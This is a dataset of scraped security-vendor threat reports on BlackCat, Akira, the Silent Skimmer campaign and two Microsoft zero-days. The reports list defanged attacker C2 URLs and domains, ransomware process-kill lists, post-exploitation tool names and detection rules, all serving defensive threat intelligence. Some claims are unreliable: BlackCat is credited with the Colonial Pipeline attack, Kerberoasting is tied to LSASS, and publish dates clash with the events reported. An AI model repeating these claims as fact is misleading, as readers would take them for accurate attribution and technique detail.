{"id":0,"title":"BlackCat Ransomware & Triple Extortion (Analysis & Tactics)","publish_date":"2021-11-28","link":"https://www.avertium.com/resources/threat-reports/blackcat-ransomware-triple-extortion-analysis-tactics","clean_text":"During 2021, the United States observed an increase in highly sophisticated ransomware attacks against 16 U.S. critical infrastructure sectors.\nThe sectors include Defense Industrial Base, Food and Agriculture, Government Facilities, and Information Technology.\nAustralia and the United Kingdom also observed an increase with ransomware actors targeting charities, public services, and local government – with the United Kingdom recognizing ransomware as their biggest cyber threat.\nWith ransomware techniques and tactics continuing to evolve, threat actors are starting to grow in technological sophistication.\nRecently, threat actors (known as ALPHV) behind the new ransomware-as-a-service (RaaS) BlackCat have proven that attackers are learning from past mistakes and are developing new ways to get the financial reward they seek.\nLet’s look at BlackCat ransomware and how they fit into our current threat intelligence landscape.\nBlackCat ransomware was discovered by researchers in November 2021.\nThe threat actors recruit affiliates to perform corporate breaches and encrypt devices.\nSo far, the cybercriminals (who only go by the name ALPHV) behind the ransomware have compromised more than twenty companies and have named those companies on their leak site.\nCurrently, ALPHV is recruiting affiliates from several ransomware gangs – including BlackMatter, REvil, and DarkSide.\nThey have also offered affiliates up to 90% of any ransom paid by an organization.\nThe BlackCat leak site has been active since early December 2021 and there is speculation that the total number of victims, including those who paid a ransom, is far greater than twenty.\nMost of the time, victims who pay ransom don’t want to risk exposure.\nALPHV’s ransom demands range from $400,000 to $3 million, with victims being given the opportunity to negotiate a lower amount if they choose to pay a ransom.\nThey can also choose to pay in privacy-preserving monero or bitcoin, but paying in bitcoin adds 15% to the ransom amount.\nAlthough the largest number of the threat actor’s victims are in the U.S., ALPHV and their affiliates have attacked organizations in the Philippines and Europe.\nThe sectors being attacked are retail, transportation, construction and engineering, telecommunication, and pharmaceuticals.\nAlthough ALPHV claims to be an apolitical group who doesn’t attack the healthcare sector, one of the victims on their leak site was from the healthcare industry.\nHowever, ALPHV stated that while they don’t attack medical institutions, their rule doesn’t apply to pharmaceutical companies or private clinics.\nBlackCat ransomware is a highly customizable ransomware that allows for attacks on a wide range of corporate environments.\nTargeting both Linux and Windows systems, BlackCat is coded in Rust (written in Russian), which is a programming language.\nResearchers believe that this is the first time a ransomware group has used Rust to write a ransomware strain.\nCyber security analysts state that Rust is a much more secure programming language compared to C and C++.\nBecause Rust is so secure, it will be difficult to find coding weaknesses.\nSecurity defenders often look for those weaknesses in ransomware strains and if more threat actors are shifting toward Rust, it will be more difficult to find the weak areas.\nBy using Rust, ALPHV’s operators are able to compile it against various operating system architectures.\nRust is a customizable programming language, which means that they have the ability to pivot and individualize attacks.\nDue to its fast and high performance, powerful web application development, low overhead for embedded programming, and memory management resolution; Rust has gained momentum and is a force to be reckoned with.\nImage 1: BlackCat Execution To maintain longevity, BlackCat uses the following flag to execute their ransomware: --access–token.\nThis makes it harder to analyze BlackCat in sandboxed environments.\nSource: Palo Alto BlackCat has several evasion tactics that are used in an effort to impair or disable system defenses and stop certain applications from locking files open on disk – which may cause problems when trying to encrypt those files.\nAdditionally, BlackCat tries to kill several processes and services to prevent any security solutions or backups an organization may have.\nPlease see the below partial process list: | agntsvc | dbeng50 | dbsnmp | encsvc | excel | infopath | | Isqlplussvc | msaccess | mspub | mydesktopqos | mydesktopservice | notepad | | ocautoupds | ocomm | ocssd | onenote | oracle | outlook | | powerpnt | sqbcoreservice | *sql* | steam | synctime | tbirdconfig | | thebat | thunderbird | visio | wiword | wordpad | xfssvcco | | bedbh | vxmon | benetns | bengien | pvlsvr | beserver | For persistence, BlackCat excludes key system and application folders from encryption, as well as key components.\nThis is done so the system and ransomware isn’t rendered inoperable.\nFolder exclusions include but are not limited to: | system volume information | intel | application data | $recycle.bin | | mozilla | boot | appdata | perflogs | | windows | | config.msi | tor browser | File name exclusions include but are not limited to: | desktop.ini | thumbs.db | ntuser.dat | windows.old | | ntldr | boot.ini | iconcache.db | autorun.inf | Files with extensions matching the following are also avoided: | themepack | bin | idx | diagpkg | | nls | lock | sys | 386 | | mpa | cur | spl | Ps1 | Promoted in Russian speaking hacking forums, BlackCat was named as such due to a black cat favicon being used on every victim’s Tor payment site.\nResearchers from Trend Micro found that not only does BlackCat encrypt data, steal data before ransomware deployment, and name-shame victims, but they also conduct a distributed-denial-of-service (DDoS) attack if victims don’t pay the ransom by the deadline.\nMost are familiar with double extortion as a known technique amongst ransomware gangs.\nThis technique typically involves ransomware gangs stealing sensitive data before infecting networks and systems with ransomware.\nThe stolen data is then used to extort the victims into paying the demanded ransom.\nIf the ransom is not paid, the threat actor will leak the stolen data on a data leak site.\nALPHV takes things a step further by adding a third layer to their extortion model – a DDoS attack if the demanded ransom isn’t paid by their deadline.\nCyber security researchers are calling the third layer triple extortion.\nWhen ALPHV interviewed with The Record, they listed the following as options available exclusively for adverts (advertisers or affiliates) who have reached the $1.5 million mark in payments: The success of BlackCat is likely due to the fact that they recruit affiliates by posting ads in forums like Ransomware Anonymous Market Place (RAMP).\nDuring their interview with The Record, BlackCat stated that they believe there is no comparative software on the market.\nThey provide high-quality software as well as a full range of services related to ransom (metaverse or premium concierge).\nThey believe they are in a different weight category, and they don’t recognize other ransomware groups as competitors or business partners.\nCyber security researchers believe that BlackCat’s ransomware operators may be associated with DarkSide and BlackMatter.\nIn November 2021, a representative from ransomware gang, LockBit, stated that BlackCat is a rebrand of DarkSide/BlackMatter.\nImage 2: A Forum Post from a LockBit Representative Source: BleepingComputer BlackCat representatives claim that they are only DarkSide/BlackMatter affiliates who launched their own ransomware operation, but researchers believe otherwise.\nLast year, we published a report on BlackMatter and their re-brand as DarkSide.\nBlackMatter was responsible for ransomware attacks on at least four healthcare or healthcare-related organizations (a pharmaceutical consulting company, a dermatology clinic, and a medical testing and diagnostics company).\nDarkSide was the threat actor behind the attack on Colonial Pipeline.\nDuring the same interview with The Record, an ALPHV representative admitted that REvil, BlackMatter, Maze, and LockBit are all connected in some way because they are adverts (advertisers or affiliates).\nALPHV went on to say that adverts write software and pick a brand name.\nPartnerships are nothing without adverts and there is no rebranding because they have no direct relation to the partnership programs.\nAdmittedly, APLHV borrowed the named groups advantages and eliminated their disadvantages.\nImage 4: Twitter Thread from Brett Callow Brett Callow from Emsisoft stated ALPHV is more than likely BlackMatter and he explained his reasoning in a series of four tweets via Twitter.\nSource: Twitter In May 2021, BlackCat ransomware was used in the attack on Colonial Pipeline.\nThis attack sparked a political firestorm and although the Russian threat actor DarkSide was attributed to the attack, the threat actor blamed an affiliate for having gone rogue.\nDarkSide ended up walking away with 63.7 bitcoins ($4.4 million) in exchange for a decryptor.\nThe FBI eventually recovered $2.3 million of the ransom payment and DarkSide went dark shortly after U.S. President Joe Biden told Russian President Vladimir Putin to crackdown on Russian ransomware groups or risk becoming a target for the U.S. By July 2021, Darkside rebranded as BlackMatter Image 5: BlackCat Ransomware Encryption Alert In BlackMatter’s case, there were encryption errors in the gang’s malware that allowed security professionals to quietly reach out to victims and restore data before a ransom was paid – which was a massive blow to BlackMatter’s profits.\nSource: SentinelLabs After the errors were discovered, DarkSide/BlackMatter fired its development team, hired a new team, then went dark in November 2021 before launching again during the same month as ALPHV (BlackCat).\nUsing BlackCat ransomware, attackers were able to infect computers at Mabanaft GmbH and Oiltanking GmbH Group in February 2022.\nThe attack took down part of Germany’s fuel-distribution system and stopped payments at some filling stations.\nAnother energy-storage company that has had IT issues recently is the Evos Group, which is located in Belgium and the Netherlands.\nIt’s important for you to remember that paying the ransom doesn’t automatically erase the security problems that allowed your organization to be attacked in the first place.\nDiscovering what went wrong and why are the first steps to fixing your security problems.\nAvertium offers the following service to help protect our organization from being exposed to ransomware like BlackCat: 2021 Trends Show Increased Globalized Threat of Ransomware | CISA Who Wrote the ALPHV/BlackCat Ransomware Strain? –\nKrebs on Security BlackCat ransomware - what you need to know | The State of Security (tripwire.com) Cyberattack Cripples European Oil Port Terminals (bankinfosecurity.com) BlackCat (ALPHV) ransomware linked to BlackMatter, DarkSide gangs (bleepingcomputer.com) LockBit, BlackCat, Swissport, Oh My!\nRansomware Activity Stays Strong | Threatpost Ransomware: Alphv/BlackCat Is DarkSide/BlackMatter Reboot (bankinfosecurity.com) Black Cat Ransomware Tied to German Fuel Attacks and Colonial Pipeline Hackers - Bloomberg Threat Assessment: BlackCat Ransomware (unit42.paloaltonetworks.com) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.\nIn this eBook, you will learn:","num_sentences":75,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"BlackCat"}}
{"id":1,"title":"Flash Notice: Two Microsoft Zero-Day Vulnerabilities Exploited by Attackers","publish_date":"2023-08-28","link":"https://www.avertium.com/resources/threat-reports/two-microsoft-zero-day-vulnerabilities-exploited-by-attackers","clean_text":"overview This week, Microsoft patched two zero-day vulnerabilities (CVE-2023-36884 and CVE-2023-38180).\nThese vulnerabilities are part of Microsoft's August 2023 Patch Tuesday, which also includes security updates for 87 vulnerabilities.\nBoth of these vulnerabilities were exploited in cyberattacks, and one of them was publicly disclosed prior to the patch release.\nCVE-2023-36884 CVE-2023-36884 is a remote code execution vulnerability that was previously patched.\nThe vulnerability allowed attackers to craft Microsoft Office documents in a way that circumvented the Mark of the Web (MoTW) security feature.\nThis allowed the files to be opened without triggering a security warning, ultimately enabling remote code execution.\nTo counteract a previously mitigated but actively exploited CVE-2023-36884 flaw, Microsoft has introduced an Office Defense in Depth update.\nThe Russian threat actor Storm-0978/RomCom is responsible for actively exploiting this vulnerability.\nThis group, previously recognized for deploying the Industrial Spy ransomware in their attacks, has now rebranded as 'Underground' and extorts victims through their ransomware operations.\nCVE-2023-38180 Microsoft also addressed CVE-2023-38180 which has been actively exploited and could potentially lead to Distributed Denial of Service (DDoS) attacks on .NET applications and Visual Studio.\nHowever, Microsoft has not provided further details regarding the specific exploitation methods employed or revealed the identity of the discoverer of the vulnerability.\nCybersecurity engineer Nikolas Cemerikic at Immersive Labs stated that while an attacker would need to be within the same network as the target system, the vulnerability doesn't require the attacker to have acquired user privileges on the target system.\nAvertium suggests that all organizations follow the appropriate security recommendations and promptly apply patches.\navertium's recommendationS - CVE-2023-36884 - Microsoft suggests the installation of both the Office updates detailed in their advisory and the Windows updates released in August 2023.\nThe last update for the advisory was August 9, 2023. -\nStorm-0978/RomCom - Enable cloud-delivered protection in Microsoft Defender Antivirus or your antivirus product's equivalent to safeguard against rapidly evolving attacker tools and techniques.\nCloud-based machine learning defenses effectively block most new and unknown variants. -\nEnable block mode for EDR in Microsoft Defender for Endpoint to proactively block malicious artifacts, even if your non-Microsoft antivirus fails to detect the threat or when Microsoft Defender Antivirus is in passive mode.\nEDR in block mode operates discreetly to remediate malicious artifacts identified after a breach. -\nMicrosoft 365 Defender customers have the option to enable attack surface reduction rules, blocking common attack techniques employed in ransomware attacks. -\nBlock all Office applications from creating child processes. -\nCVE-2023-38180 - Although Microsoft has not provided any details for CVE-2023-38180, they have released an update for the vulnerability which you can find in their advisory.\nINDICATORS OF COMPROMISE (IoCs) RomCom - FileHash-MD5 - 00ad6d892612d1fc3fa41fdc803cc0f3 - 6f47723e5fc6e96ab5e9f96f6bc585fa - d227874863036b8e73a3894a19bd25a0 - f4959e947cee62a3fa34d9c191dd9351 - FileHash-SHA1 - 04e3be2ff570eb1a479925560103af5d22961983 - 2400b169ee2c38ac146c67408debc9b4fa4fca5f - 3de83c6298a7dc6312c352d4984be8e1cb698476 - FileHash-SHA256 - 0501d09a219131657c54dba71faf2b9d793e466f2c7fdf6b0b3c50ec5b866b2a - 07377209fe68a98e9bca310d9749daa4eb79558e9fc419cf0b02a9e37679038d - 1a7bb878c826fe0ca9a0677ed072ee9a57a228a09ee02b3c5bd00f54f354930f - 3a3138c5add59d2172ad33bc6761f2f82ba344f3d03a2269c623f22c1a35df97 - a61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f - e7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539 - URLs - hxxp://104.234.239.26/share1/MSHTML_C7 - hxxp://104.234.239.26/share1/MSHTML_C7/1/99.99.99.99_a15fa_file001.htm?d=99.99.99.99_ - hxxp://65.21.27.250:8080 - hxxp://65.21.27.250:8080/mds/O--------------------------http://65.21.27.250:8080/mds/D--------------------------http://65.21.27.250:8080/mds/S-------------------------- - hxxp://74[.]50.94.156/MSHTML_C7/o2010.asp?d=99.99.99.99* - hxxp://74[.]50.94.156/MSHTML_C7/start.xml - hxxp://74[.]50.94.156/MSHTML_C7/zip_k.asp?d=34.141.245.25_f68f9_ - hxxp://74[.]50.94.156/MSHTML_C7/zip_k.asp?d=99.99.99.99. -\nhxxp://74[.]50.94.156/MSHTML_C7/zip_k2.asp?d=34.141.245.25_f68f9_ - hxxp://74[.]50.94.156/MSHTML_C7/zip_k2.asp?d=99.99.99.99. -\nhxxp://74[.]50.94.156/MSHTML_C7/zip_k3.asp?d=34.141.245.25_f68f9_ - hxxp://74[.]50.94.156/MSHTML_C7/zip_k3.asp?d=99.99.99.99. -\nhxxp://74[.]50.94.156/share1/MSHTML_C7/1/ - hxxp://finformservice[.]com:80/api/v1.5/ - hxxp://finformservice[.]com:80/api/v1.5/subscriptiontoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNDU2Nzg5LCJuYW1lIjoiSm9zZXBoI - Domains - Altimata[.]org - Bentaxworld[.]com - Finformservice[.]com - Penofach[.]com - Ukrainianworldcongress[.]info - Dashboard[.]penofach[.]com How Avertium is Protecting Our CUSTOMERS - Avertium’s Capability Development Team found several detections for activity related to Storm-0978/RomCom. -\nPlease Note: These detections could have a high volume of false positives if script interpreters or shell processes are launched as part of normal activity.\nI.e., Excel being used to launch PowerShell to gather live data.\n| Suspicious Microsoft Office Child Process | Detects a suspicious process spawning from one of the Microsoft Office suite products.\n| | Microsoft Office spawning script interpreter | Detects when an office application is attempting to spawn a script interpreter.\n| - Avertium offers Vulnerability Management (VM) to provide a deeper understanding and control over organizational information security risks.\nIf your enterprise is facing challenges with the scope, resources, or skills required to implement a vulnerability management program with your team, outsourced solutions can help you bridge the gap. -\nFusion MXDR for Microsoft combines Avertium's Fusion MXDR approach with Microsoft Security Solutions, creating the first MDR offering that integrates all aspects of security operations into an active and threat-informed XDR solution.\nLeveraging Microsoft's comprehensive and cost-effective technology, Fusion MXDR for Microsoft delivers a release of cyber energy, encompassing implementation, optimization, ongoing management, and tuning.\nSUPPORTING DOCUMENTATION","num_sentences":35,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"CVE-2023-36884"}}
{"id":2,"title":"Everything You Need to Know About Silent Skimming","publish_date":"2023-05-28","link":"https://www.avertium.com/resources/threat-reports/everything-you-need-to-know-about-silent-skimming","clean_text":"The holiday season brings increased online shopping, but it also attracts threat actors seeking to take advantage of unsuspecting shoppers.\nThis week, we'll explain \"Silent Skimming\" a financially motivated campaign that targets online payment businesses.\nThis campaign primarily victimizes online businesses and point-of-sale service providers, as well as their consumers.\nGiven the increased online shopping during the holiday season, it's important to understand how threat actors exploit individuals who may be unaware of such activities.\nLet’s dive into Silent Skimming and help you stay informed and secure during this holiday season.\nSilent Skimming or Silent Skimmer is an active campaign discovered by BlackBerry that has existed for over a year.\nThe campaign is financially motivated and targets online payment businesses, specifically focusing on online businesses and point-of-sale (POS) service providers.\nAs of now, targets include online payment businesses in the Asia-Pacific, North America, and Latin America regions.\nBlackBerry is attributing the campaign to a threat actor who knows the Chinese language.\nThe threat actor behind the campaign deploys payment scraping mechanisms to extract sensitive financial data from users.\nThe targeted industries are diverse but are generally industries that host or create payment infrastructure.\nThe attack method involves exploiting internet-facing applications for initial access and deploying various tools to escalate privileges, execute code, and gain remote access.\nThe threat actors behind the most recent Silent Skimming campaign have been exploiting a .NET deserialization vulnerability, tracked as CVE-2019-18935, in the Progress Telerik UI for ASAP.NET AJAX since May 2023.\nThis vulnerability allows them to execute malicious DLL code remotely on targeted servers.\nOnce initial access is gained, the attackers deploy an array of tools hosted on an attacker-controlled HTTP File Server.\nThese tools include downloader scripts, remote access scripts, webshells, exploits, and Cobalt Strike beacons.\nIn the final stage, user information such as billing and credit card details is exfiltrated using Cloudflare.\nImage 1: Tools | Tool: | ITW Tool Name: | Purpose: | | BadPotato | bpo.exe | Privilege Escalation | | Godzilla Webshell | bypass.aspx | Remote Code Execution | | PowerShell RAT | client111.ps1 | Remote Access | | SharpToken | ConfusedToken.exe | Privilege Escalation | | GodPotato | GodPotato-NET4.exe | Privilege Escalation | | Juicy Potato | j.exe | Privilege Escalation | | HTML Application | MsMsp.hta | Downloader/Stager | | scvhost.exe | Post Exploitation | | | SweetPotato | SPO.exe | Privilege Escalation | Source: BlackBerry Let’s break down the attack vector for the Silent Skimming campaign: Target Selection: Tools Used: Exploiting Telerik UI Vulnerability (CVE-2019-18935): Initial Payload: Exploitation Process: Insecure Deserialization: Execution of Malicious DLL: In simpler terms, the attackers target websites with known vulnerabilities, use tools to exploit these weaknesses, and specifically take advantage of a Telerik UI software flaw.\nThey deploy a sneaky DLL through a tricky process, exploiting insecure deserialization, and ultimately execute a malicious HTML application to carry out their skimming activities.\nThe threat actors then use VBScript to transfer control to PowerShell, leveraging the server.ps1 RAT.\nThis RAT establishes a connection to a hardcoded C2 server, providing the threat actor with control over the compromised system.\nThe C2 server operates as an HTTP file server hosting a diverse set of tools for post-exploitation, allowing the attackers to perform various malicious actions on the compromised server.\nThere are a few reasons why the researchers at BlackBerry believe that Silent Skimmer campaign is the work of a threat actor based in Asia.\nFirstly, there is proof that the threat actor knows Chinese based on the language they use in their code.\nThis is evident in the simplified Chinese used in the PowerShell RAT code and the association with a GitHub repository linked to Chinese-speaking developers.\nSecondly, geographical cues play a role in attribution, as the attacker's C2 server is located in Asia, particularly Japan.\nAdditionally, the strategic deployment of Virtual Private Servers (VPS) tailored to the target's location, such as using a Canadian-based VPS for attacks on Canadian businesses, hints at a sophisticated understanding of regional contexts.\nThe dynamic adaptation of network infrastructure based on victim geolocation suggests a high level of technical expertise.\nThe campaign's expansion over a year, initially concentrating on the Asia-Pacific region and later including North America, implies a persistent and evolving threat.\nThe targeting strategy, focusing on vulnerable web applications across diverse industries involved in payment infrastructure, highlights the threat actor's adaptability rather than a narrow industry-specific approach.\nAlthough not directly related, Avertium's intelligence partner, RedSense, reports that two post-Conti groups closely align with the tactics and motives of the Silent Skimming campaigns in their attack strategies, BlackSuit and Zeon.\nBlackSuit, a rebranding of the Royal ransomware group, focuses on institutions possessing valuable financial and informational assets.\nThe group has used compromised software source codes in their targeting of the retail sector, mirroring the tactics observed in 2019 when Amiak took control of POS Merchant servers belonging to a Canadian POS merchant and software provider.\nAmiak achieved this through the exploitation of MSSQL and RDP access points.\nThe group also has former members of the Ryuk and REvil ransomware group within their current operation, as well as the threat actors responsible for the attack on Costa Rica, Dallas, and Southwest Airlines.\nBlack Suit’s emphasis on data exfiltration and encryption suggests a likelihood of third-party attacks targeting retail entities.\nAdvanced Intelligence also stated that the threat actor Zeon has utilized a modified version of legitimate software to develop a new reverse proxy spam engine called ZProxy.\nZProxy is a tool designed for generating phishing pages to gather user data, which the operator subsequently inputs into the authentic website.\nThis method allows the operator to bypass 2FA protections, facilitating the collection and storage of user data.\nThe intended use of ZProxy involves employing it as a \"man-in-the-middle\" technique to initiate sessions and capture payment data.\nInformation from RedSense's primary source intelligence indicates that the group aims to employ ZProxy for upcoming financial fraud activities, mirroring the Silent Skimming techniques outlined in this report.\nThe threat actor behind the Silent Skimming/Silent Skimmer campaign mainly targets local payment websites, exploiting common tech weaknesses to grab sensitive payment data without permission.\nThis puts the average holiday online shopper at risk.\nStay safe this season by adhering to these recommendations: The Payment Card Industry Data Security Standard (PCI DSS) establishes security requirements for organizations handling payment card data.\nCompliance with PCI DSS Requirement 6.5 focuses on addressing vulnerabilities within third-party applications and component integrations.\nOne way organizations can help safeguard customers’ payment information is via Avertium’s Governance, Risk, and Compliance (GRC) service.\nGRC services help organizations identify, assess, and prioritize risks, including those posed by cyber threats like silent skimming.\nThis proactive approach allows organizations to understand the potential impact of such threats on their operations and take preventive measures.\nAlso, GRC services assist organizations in staying compliant with relevant regulations and standards.\nIn the case of silent skimming, adherence to data protection and payment card industry standards is important.\nGRC tools provide frameworks to ensure that organizations meet these compliance requirements, reducing the risk of legal and financial consequences.\nIt’s important to get ahead of the curve by being proactive with protecting your organization, instead of waiting to put out a massive fire.\nAvertium can provide the following services to help keep your organization safe from attack campaigns like Silent Skimming: Resource Development Initial Access Execution Discovery Defense Evasion Persistence Privilege Escalation Command-and-Control Exfiltration Hashes Hostname URLs Silent Skimmer: Online Payment Scraping Campaign Shifts Targets From APAC to NALA (blackberry.com) Understanding Skimming and How to Prevent It (flagright.com) Silent Skimmer: The Rising Threat in Card-Skimming Attacks - Security Boulevard What is PCI DSS?\nRequirements & How to Comply (itgovernance.co.uk) Payment Card Industry Data Security Standard (pcisecuritystandards.org) Chinese Hackers Target North American, APAC Firms in Web Skimmer Campaign - SecurityWeek Online payment firms subjected to extended web skimming attack | SC Media (scmagazine.com) Latest evolution of ‘pig butchering’ scam lures victim into fake mining scheme – Sophos News Chinese Silent Skimmer Attack Hits APAC and NALA Online Payment Firms (hackread.com) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.","num_sentences":57,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"Silent Skimming"}}
{"id":3,"title":"An Update on Akira Ransomware","publish_date":"2023-03-28","link":"https://www.avertium.com/resources/threat-reports/an-update-on-akira-ransomware","clean_text":"During the spring of 2023, Avertium's Cyber Threat Intelligence team published a Threat Intelligence Report, shedding light on lesser-known ransomware groups that had largely eluded media attention.\nAmong these was Akira, a relatively new group in the ransomware space.\nThe group predominantly set its sights on small and medium-sized businesses, issuing ransom demands ranging from $50,000 to $500,000.\nUsing an array of strategies, including phishing emails and exploiting unpatched software vulnerabilities, they gained access to their victims' systems.\nFast forward to the spring of 2024, Akira has gained significant attention, earning around $42 million in ransom payments.\nThey breached over 250 entities across three continents between March 2023, when they emerged, and January 2024.\nWith evolved tactics and an expanded scope, let’s look at Akira's recent activities, as well as recommendations on how organizations can defend themselves against this threat actor.\nImage 1: Akira's Leak Site In 2023, the Akira ransomware group, then a relatively new player in the ransomware market, claimed responsibility for three attacks during March 2023.\nThe victims included 4LEAF, an American engineering consultancy business; Park-Rite, a U.S.-based packaging materials manufacturer; and Family Day Care Services, a Canadian childcare service.\nAkira listed the names of the three victims on their leak site, threatening to release company records if they refused to pay a ransom.\nBridgeValley Community and Technical College also became Akira's victim and were added to the group’s shame site on May 1, 2023.\nThe college acknowledged the ransomware attack, which caused a network outage on April 4th.\nThe very first victim listed on Akira’s leak site was a UK-based architecture firm, from which Akira claimed to have stolen more than 11 GB of data.\nThe second victim was a U.S.-based IT services company, facing a ransom demand of $100,000, while the third victim was a European pharmaceutical company, with a ransom demand of $50,000.\nAkira seemed to be targeting small and medium-sized businesses, with ransom demands ranging from $50,000 to $500,000.\nSome of the stolen data had already been sold on the dark web.\nAkira utilized various tactics to gain access to their victims' systems, including phishing emails and exploiting unpatched vulnerabilities in software.\nThey also used remote desktop protocol (RDP) brute force attacks to infiltrate networks.\nIn the spring of 2024, the United States’ Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Europol’s European Cybercrime Centre (EC3), and the Netherlands’ National Cyber Security Centre (NCSC-NL) issued a joint advisory concerning Akira.\nSince March 2023, Akira has had a significant impact on various businesses and critical infrastructure entities across North America, Europe, and Australia.\nNotably, in April 2023, after initially focusing on Windows systems, Akira threat actors introduced a Linux variant targeting VMware ESXi virtual machines.\nThe group has attacked organizations within the financial, manufacturing, real estate, healthcare, and educational sectors.\nImage 2: Victim County Distribution Source: Trellix Linux versions of Akira ransomware have been detected since June 2023.\nThe ransomware is typically introduced through the exploitation of vulnerable services and applications that are accessible to the public.\nAdditionally, the group has a history of exploiting weaknesses in multi-factor authentication systems or taking advantage of their absence.\nEarlier versions of Akira ransomware, coded in C++, encrypted files with a .akira extension.\nHowever, starting from August 2023, certain Akira attacks began deploying Megazord, a Rust-based code encrypting files with a .powerranges extension.\nAkira threat actors have consistently utilized both Megazord and Akira, including Akira_v2, interchangeably.\nOnce gaining initial access, Akira threat actors try to establish persistence by exploiting domain controllers, often creating new domain accounts for this purpose.\nNotably, the FBI has observed instances where Akira generates an administrative account named \"itadm\".\nAdditionally, they utilize post-exploitation techniques like Kerberoasting to extract credentials from the memory of the Local Security Authority Subsystem Service (LSASS).\nCredential scraping tools such as Mimikatz and LaZagne aid in privilege escalation.\nFor reconnaissance, Akira actors frequently use tools like SoftPerfect and Advanced IP Scanner for network device discovery and Windows commands to identify domain controllers and gather information on domain trust relationships.\nAkira uses two ransomware variants simultaneously during attacks, differing from their usual methods.\nInitially, they deploy the Windows-specific \"Megazord\" ransomware alongside a second payload known as Akira_v2 ESXi encryptor.\nAdditionally, Akira disables security software to facilitate lateral movement, using tools like PowerTool to exploit vulnerabilities and terminate antivirus processes.\nFor exfiltration and impact, Akira actors use various tools like FileZilla, WinRAR, WinSCP, and RClone for data exfiltration, while establishing command and control channels through AnyDesk, MobaXterm, RustDesk, Ngrok, and Cloudflare Tunnel.\nThey use FTP, SFTP, and cloud storage services for exfiltration and adopt a double-extortion model, encrypting systems post-data exfiltration.\nThe ransomware group provides unique codes and instructions via a .onion URL, threatening to publish data on the Tor network and even contacting victimized companies.\nIn terms of encryption, Akira uses a hybrid encryption scheme combining ChaCha20 and RSA public-key cryptosystem.\nEncrypted files have .akira or .powerranges extensions, and the encryptor deletes volume shadow copies using PowerShell commands.\nThe upgraded Akira_v2 encryptor, written in Rust, offers additional functionalities like CPU core control and Build ID protection.\nIt may append \"akiranew\" as a file extension or add \"akiranew.txt\" as a ransom note after encryption.\nAkira has clearly shifted their focus from solely targeting Windows systems.\nThis year, they have expanded their scope to target Linux systems and virtual machines with a custom payload, marking a significant departure from their previous activities.\nTo safeguard against Akira ransomware attacks, administrators must take proactive measures to fortify their systems and networks.\nBelow are recommended actions: The insights shared here expose the dynamic strategies and methods used by the Akira ransomware group.\nTheir pivot towards targeting Linux systems, coupled with their ongoing utilization of Windows-specific tactics, highlights their adaptive nature in exploiting vulnerabilities across diverse operating environments.\nCollaborative efforts between cybersecurity agencies and independent researchers have provided valuable awareness of Akira's operational patterns, emphasizing the need for proactive defense measures and robust cybersecurity protocols across organizations.\nAs Akira continues to evolve its tactics and extend its impact, it becomes increasingly important for organizations to remain vigilant and fortified against emerging threats like Akira.\nIt’s important to get ahead of the curve by being proactive with protecting your organization, instead of waiting to put out a massive fire.\nLook at some of the services Avertium offers that keep organizations like yours safe from threat actors like Akira: MD5 SHA1 SHA256 For detailed indicators, please see the following links: Akira Virus Ransomware [.akira Files] Remove + Restore (sensorstechforum.com) Akira Ransomware Removal Report (enigmasoftware.com) #StopRansomware: Akira Ransomware (cisa.gov) Akira ransomware now targets Linux (dxc.com) Akira ransomware targets VMware ESXi servers (quorumcyber.com) From Conti to Akira | Decoding the Latest Linux & ESXi Ransomware Families (sentinelone.com) Akira, again: The ransomware that keeps on taking – Sophos News Ransomware - Akira and Rapture (avertium.com) Cracking Akira Ransomware: Prevention and Analysis by TTPs (morphisec.com) Ransomware Roundup - Akira | FortiGuard Labs (fortinet.com) Akira Ransomware (trellix.com) #StopRansomware: Akira Ransomware - AlienVault - Open Threat Exchange Akira takes in $42 million in ransom payments, now targets Linux servers | SC Media (scmagazine.com) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.","num_sentences":55,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"akira"}}
{"id":4,"title":"New Ransomware Strains - CACTUS and 3AM","publish_date":"2023-01-28","link":"https://www.avertium.com/resources/threat-reports/new-ransomware-strains-cactus-and-3am","clean_text":"In January 2023, there was a significant 41% decrease in ransomware victim posting rates across all groups compared to December 2022, signaling an overall decline in ransomware activities.\nDespite this downturn, LockBit continued to be a dominant force in ransomware incidents, maintaining their position at the forefront of the threat landscape.\nAvertium's End of the Year Recap for 2022 already predicted a diminishing return on investment for ransomware gangs, yet anticipated ransomware to persist as a major issue for organizations in 2023.\nThe report identified five major ransomware groups—LockBit, BlackCat (ALPHV), Royal, Vice Society, and Medusa—as responsible for the most disruptive attacks.\nCorvus Insurance's Q3 2023 Global Ransomware Report further emphasized the severity of the ransomware landscape, revealing a resurgence in global incidents.\nThe number of ransomware victims in 2023 has already exceeded the combined totals of 2021 and 2022, indicating an alarming trend.\nThe report highlighted the CL0P ransomware group's pivotal role in the elevated Q3 ransomware numbers, attributing the spike to mass exploits targeting vulnerabilities in file transfer software.\nIndustries such as law practices, government agencies (due to LockBit), manufacturing, oil and gas, and transportation, 